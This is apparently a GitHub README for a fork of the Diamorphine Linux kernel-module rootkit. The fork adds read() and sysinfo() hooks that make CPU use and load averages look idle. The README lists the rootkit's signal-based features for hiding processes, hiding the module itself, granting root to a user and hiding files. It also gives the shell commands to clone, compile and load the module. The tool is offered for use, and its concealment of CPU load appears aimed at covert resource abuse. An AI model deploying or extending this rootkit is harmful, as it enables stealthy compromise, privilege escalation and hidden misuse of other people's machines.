Diamorphine + hideusage fork
===========

Diamorphine is a LKM rootkit for Linux Kernels 2.6.x/3.x/4.x originally developed by m0nad and forked by me.
This fork hides high CPU usage from tools like top, htop or other commonly used utilities, by hooking the read() syscall and modifying the buffer returning the contents for /proc/stat and /proc/loadavg. The syscall sysinfo() is also hooked, but it's not used by these tools. 

When this module is loaded, the cpu idle time will never be less than ~99% and load averages will always be below 0.20.

Apparently some of the functions on string.h call read() and that may cause an infinite recursion loop, hanging the thread and eventually crashing the kernel due to it running out of stack space. At least that's my hypothesis. That's why I had to rewrite many string handling functions.

Disclaimer
--
This fork has not been tested as much as the original and may be unstable on some linux distributions. Please let me know if this happens with an issue, together with your distribution and your kernel version and architecture.

Any other suggestions and/or comments are welcome!

Many thanks to m0nad for developing the original rootkit!

Features
--

- When loaded, the module starts invisible;

- Hide/unhide any process by sending a signal 31;

- Sending a signal 63(to any pid) makes the module become (in)visible;

- Sending a signal 64(to any pid) makes the given user become root;

- Files or directories starting with the MAGIC_PREFIX become invisble;

- Load average will be random values from 0.00 to 0.20.

- Processor will always look as if was idle.

- Original source: https://github.com/m0nad/Diamorphine

Install
--

Verify if the kernel is 2.6.x/3.x/4.x
```
uname -r
```

Clone the repository
```
git clone https://github.com/m0nad/Diamorphine
```

Enter the folder
```
cd Diamorphine
```

Compile
```
make
```

Load the module(as root)
```
insmod diamorphine.ko
```

Uninstall
--

The module starts invisible, to remove you need to make its visible
```
kill -63 0
```

Then remove the module(as root)
```
rmmod diamorphine
```

References
--
Wikipedia Rootkit
https://en.wikipedia.org/wiki/Rootkit

Linux Device Drivers
http://lwn.net/Kernel/LDD3/

LKM HACKING
https://www.thc.org/papers/LKM_HACKING.html

Memset's blog
http://memset.wordpress.com/

Linux on-the-fly kernel patching without LKM
http://phrack.org/issues/58/7.html

WRITING A SIMPLE ROOTKIT FOR LINUX
http://big-daddy.fr/repository/Documentation/Hacking/Security/Malware/Rootkits/writing-rootkit.txt

Linux Cross Reference
http://lxr.free-electrons.com/
